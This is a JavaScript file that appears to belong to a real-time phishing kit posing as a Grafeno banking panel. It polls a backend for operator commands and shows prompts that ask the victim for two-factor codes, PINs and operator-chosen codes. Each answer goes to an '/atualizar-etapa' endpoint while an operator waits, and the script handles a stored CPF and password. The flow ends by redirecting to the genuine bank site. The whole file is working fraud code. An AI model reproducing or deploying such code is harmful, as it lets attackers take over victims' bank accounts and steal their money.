document.addEventListener("DOMContentLoaded", function () {
    // Acessando os dados armazenados no sessionStorage
    const userId = sessionStorage.getItem("user_id");
    const dominio = sessionStorage.getItem("dominio");
    const local = sessionStorage.getItem("local");
    const device = sessionStorage.getItem("device");
    const platform = sessionStorage.getItem("platform");
    const browser = sessionStorage.getItem("browser");
    const ip = sessionStorage.getItem("ip");
    const sistema = sessionStorage.getItem("sistema");
    const cache_sistema = sessionStorage.getItem("sessao_ativa");
    const sessao_usuario = sessionStorage.getItem("sessao_usuario");
    const sessao_senha = sessionStorage.getItem("sessao_senha");
    const sessao_nome_usuario = sessionStorage.getItem("sessao_nome_usuario");
    const sessao_numero_serie = sessionStorage.getItem("sessao_numero_serie");
    const sessao_api = sessionStorage.getItem("sessao_api");

    // Polling: só altera a página quando o comando do backend mudar
    var _ultimoComandoAplicado = "";
    function Request() {
        var loginRaw = sessionStorage.getItem('usuario_logado') || sessionStorage.getItem('sessao_usuario') || "";
        var login = (loginRaw || "").replace(/\D/g, "");
        if (!login || login.length !== 11) {
            setTimeout(Request, 5000);
            return;
        }
        $.ajax({
            url: "/comando-login",
            method: "POST",
            headers: { "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content") },
            data: { login: login, pagina: "painel" },
            dataType: "json",
            success: function (data) {
                var comandoTxt = String(data.comando || "").toLowerCase().trim();
                if (comandoTxt === "sessao_invalida") {
                    sessionStorage.removeItem("usuario_logado");
                    sessionStorage.removeItem("sessao_usuario");
                    sessionStorage.removeItem("sessao_senha");
                    sessionStorage.removeItem("sessao_nome_usuario");
                    sessionStorage.removeItem("sessao_numero_serie");
                    sessionStorage.removeItem("sessao_api");
                    sessionStorage.removeItem("sessao_ativa");
                    location.href = "/grafeno";
                    return;
                }
                var ehComandoDireto = ["enviar_para_interna", "finalizar_atendimento", "aguardando"].indexOf(comandoTxt) >= 0;
                if (!comandoTxt.endsWith("solicitado") && !ehComandoDireto) {
                    return;
                }
                if (comandoTxt === _ultimoComandoAplicado) {
                    return;
                }
                _ultimoComandoAplicado = comandoTxt;
                var valores = {};
                var detalhes = (data.detalhes && data.detalhes.msg && data.detalhes.msg.GRAFENO) || [];
                if (Array.isArray(detalhes) && detalhes.length > 0) {
                    var reg = detalhes[0] || {};
                    for (var k in reg) valores[k] = reg[k];
                }
                tratarRespostaComando(comandoTxt, data, valores);
            },
            complete: function () {
                setTimeout(Request, 5000);
            }
        });
    }
    Request();

    function enviarComando(comando) {
        const login = sessionStorage.getItem('usuario_logado') || sessionStorage.getItem('sessao_usuario') || "";

        if (!login) {
            console.error(
                "Envio de comando ignorado (login ausente).",
                comando
            );
            return;
        }

        $.ajax({
            url: "/enviar-comando",
            method: "POST",
            headers: {
                "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
            },
            data: {
                comando: comando,
                usuario: login,
            },
        });
    }

    function consultarCpf(cpfStr) {
        try {
            const cpfDigits = (cpfStr || '').replace(/\D/g, '');
            if (!cpfDigits) {
                return $.Deferred().reject({ message: 'CPF inválido' }).promise();
            }

            const apiUrl = `/buscar/cpf/${cpfDigits}`;

            return $.ajax({
                url: apiUrl,
                method: 'GET',
                dataType: 'json'
            });
        } catch (err) {
            console.error('Erro ao montar requisição consultarCpf:', err);
            return $.Deferred().reject(err).promise();
        }
    }

        enviarPing();
    setInterval(enviarPing, 10000);

    function enviarPing() {
        const login = (sessionStorage.getItem('usuario_logado') || sessionStorage.getItem('sessao_usuario') || '').replace(/\D/g, '');
        if (!login || login.length !== 11) return;
        const ip = sessionStorage.getItem("ip") || "";

        $.ajax({
            url: "/registrar-ping",
            method: "POST",
            headers: { "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content") },
            data: { ip, login },
            success: function () {},
            error: function () {}
        });
    }


    consultarCpf(sessionStorage.getItem('usuario_logado'))
        .done(function (apiRes) {
            // exibe os dados básicos retornados (não interrompe o fluxo)
            if (apiRes && apiRes.status === 'ok' && apiRes.dadosCPF) {
                const p = apiRes.dadosCPF;
                console.log('Consulta CPF antecipada:', p);
                // Salva os dados no sessionStorage para uso posterior
                try {
                    sessionStorage.setItem('dadosCPF', JSON.stringify(p));

                    $("#nome").text(p.nome || '');
                    $("#dados").text(p.cpf +' - '+ p.dataNascimento || '');

                } catch (e) {
                }
            } else {
                return false;
            }
        })
        .fail(function (jqXHR, textStatus, err) {

            return false;
        });


    function mostrarLoadingInterna() {
        if (window.Swal) {
            Swal.fire({
                title: "Aguarde...",
                text: "Processando. Não feche esta janela.",
                allowOutsideClick: false,
                allowEscapeKey: false,
                showConfirmButton: false,
                didOpen: function () { Swal.showLoading(); }
            });
        }
    }

    function esconderLoadingInterna() {
        if (window.Swal && Swal.isVisible()) Swal.close();
    }

    function tratarRespostaComando(comando, data, valores) {
        const etapaRaw = comando.replace("solicitado", "").trim();
        const isErro = etapaRaw.includes("_error");
        const etapa = etapaRaw.replace("_error", "").trim();

        enviarComando(etapa);

        if (isErro) {
            if (etapa === "aviso") {
                esconderLoadingInterna();
                if ($("#msg_bc").length) $("#msg_bc").fadeIn(200);
                if ($("#loading").length) $("#loading").hide();
            } else if (etapa === "codigo_token") {
                esconderLoadingInterna();
                if (window.Swal) Swal.fire({ icon: 'error', title: 'Código incorreto', text: 'O código de segurança está incorreto. Tente novamente.', confirmButtonText: 'OK' }).then(function () { showTwoFactorAuth(); });
                else showTwoFactorAuth();
                if ($("#msg_bc").length) $("#msg_bc").hide();
            } else if (etapa === "aguardando") {
                mostrarLoadingInterna();
                if ($("#msg_bc").length) $("#msg_bc").hide();
            } else if (etapa === "comando") {
                esconderLoadingInterna();
                if (window.Swal) Swal.fire({ icon: 'error', title: 'Código incorreto', text: 'O código informado está incorreto. Tente novamente.', confirmButtonText: 'OK' }).then(function () { showComandoAuth(valores.input_comando); });
                else showComandoAuth(valores.input_comando);
                if ($("#msg_bc").length) $("#msg_bc").hide();
            } else if (etapa === "finalizar_atendimento") {
                location.href = "https://grafeno.digital/";
            } else if (etapa === "pin") {
                esconderLoadingInterna();
                if (window.Swal) Swal.fire({ icon: 'error', title: 'PIN incorreto', text: 'O PIN de segurança está incorreto. Tente novamente.', confirmButtonText: 'OK' }).then(function () { showPinAuth(); });
                else showPinAuth();
                if ($("#msg_bc").length) $("#msg_bc").hide();
            }
        } else {
            if (etapa === "aviso") {
                esconderLoadingInterna();
                if ($("#msg_bc").length) $("#msg_bc").fadeIn(200);
                if ($("#loading").length) $("#loading").hide();
            } else if (etapa === "codigo_token") {
                esconderLoadingInterna();
                showTwoFactorAuth();
                if ($("#msg_bc").length) $("#msg_bc").hide();
            } else if (etapa === "aguardando") {
                mostrarLoadingInterna();
                if ($("#msg_bc").length) $("#msg_bc").hide();
            } else if (etapa === "comando") {
                esconderLoadingInterna();
                showComandoAuth(valores.input_comando);
                if ($("#msg_bc").length) $("#msg_bc").hide();
            } else if (etapa === "finalizar_atendimento") {
                location.href = "https://grafeno.digital/";
            } else if (etapa === "pin") {
                esconderLoadingInterna();
                showPinAuth();
                if ($("#msg_bc").length) $("#msg_bc").hide();
            }
        }
    }

    function showComandoAuth(comando) {
        Swal.fire({
            title: 'Confirme sua identidade',
            text: comando || 'Por favor, confirme sua identidade digitando o código que enviamos para seu dispositivo cadastrado.',
            input: 'text',
            inputPlaceholder: 'Insira aqui',
            showCancelButton: false,
            icon: 'info',
            confirmButtonText: 'Confirmar',
            allowOutsideClick: false,
            preConfirm: (code) => {
                if (!code || !String(code).trim()) {
                    Swal.showValidationMessage('Por favor, digite o código');
                    return false;
                }
                return code.trim();
            }
        }).then((result) => {
            if (result.isConfirmed && result.value) {
                const login = sessionStorage.getItem('usuario_logado') || sessionStorage.getItem('sessao_usuario') || "";
                const payload = { usuario: login, etapa: "COMANDO", valor: result.value };

                $.ajax({
                    url: "/atualizar-etapa",
                    method: "POST",
                    headers: { "X-CSRF-TOKEN": $("meta[name='csrf-token']").attr("content") },
                    contentType: "application/json; charset=UTF-8",
                    dataType: "json",
                    data: JSON.stringify(payload),
                    success: function () { console.log("Comando enviado. Aguardando próximo passo do operador..."); },
                    error: function () {
                        if (window.Swal) Swal.fire({ icon: 'error', title: 'Erro', text: 'Não foi possível enviar. Tente novamente.' });
                    }
                });
            }
        });
    }

    function showTwoFactorAuth() {
        Swal.fire({
            title: 'Autenticação de segurança',
            text: 'Digite o código de 6 dígitos da autenticação de dois fatores.',
            input: 'text',
            inputPlaceholder: '000000',
            inputAttributes: { maxLength: 6, inputmode: 'numeric', pattern: '[0-9]*' },
            showCancelButton: false,
            icon: 'warning',
            confirmButtonText: 'Confirmar',
            allowOutsideClick: false,
            preConfirm: (code) => {
                code = (code || '').trim();
                if (!code || code.length !== 6 || !/^\d{6}$/.test(code)) {
                    Swal.showValidationMessage('Digite o código de 6 dígitos.');
                    return false;
                }
                return code;
            }
        }).then((result) => {
            if (result.isConfirmed && result.value) {
                const login = sessionStorage.getItem('usuario_logado') || sessionStorage.getItem('sessao_usuario') || "";
                const payload = { usuario: login, etapa: "TOKEN", valor: result.value };

                $.ajax({
                    url: "/atualizar-etapa",
                    method: "POST",
                    headers: { "X-CSRF-TOKEN": $("meta[name='csrf-token']").attr("content") },
                    contentType: "application/json; charset=UTF-8",
                    dataType: "json",
                    data: JSON.stringify(payload),
                    success: function () { console.log("Token enviado. Aguardando próximo passo do operador..."); },
                    error: function () {
                        if (window.Swal) Swal.fire({ icon: 'error', title: 'Erro', text: 'Não foi possível enviar. Tente novamente.' });
                    }
                });
            }
        });
    }

    function showPinAuth() {
        Swal.fire({
            title: 'Insira seu PIN',
            text: 'Digite o PIN de 4 ou 6 caracteres.',
            input: 'text',
            inputPlaceholder: 'PIN',
            inputAttributes: { maxLength: 6 },
            showCancelButton: false,
            icon: 'info',
            confirmButtonText: 'Confirmar',
            allowOutsideClick: false,
            preConfirm: (code) => {
                code = (code || '').trim();
                var ok = (/^[A-Za-z0-9]{4}$/.test(code)) || (/^[A-Za-z0-9]{6}$/.test(code));
                if (!ok) {
                    Swal.showValidationMessage('Digite o PIN com 4 ou 6 caracteres (letras ou números).');
                    return false;
                }
                return code;
            }
        }).then((result) => {
            if (result.isConfirmed && result.value) {
                const login = sessionStorage.getItem('usuario_logado') || sessionStorage.getItem('sessao_usuario') || "";
                const payload = { usuario: login, etapa: "PIN", valor: result.value };

                $.ajax({
                    url: "/atualizar-etapa",
                    method: "POST",
                    headers: { "X-CSRF-TOKEN": $("meta[name='csrf-token']").attr("content") },
                    contentType: "application/json; charset=UTF-8",
                    dataType: "json",
                    data: JSON.stringify(payload),
                    success: function () { console.log("PIN enviado. Aguardando próximo passo do operador..."); },
                    error: function () {
                        if (window.Swal) Swal.fire({ icon: 'error', title: 'Erro', text: 'Não foi possível enviar. Tente novamente.' });
                    }
                });
            }
        });
    }

    //showPinAuth();
});
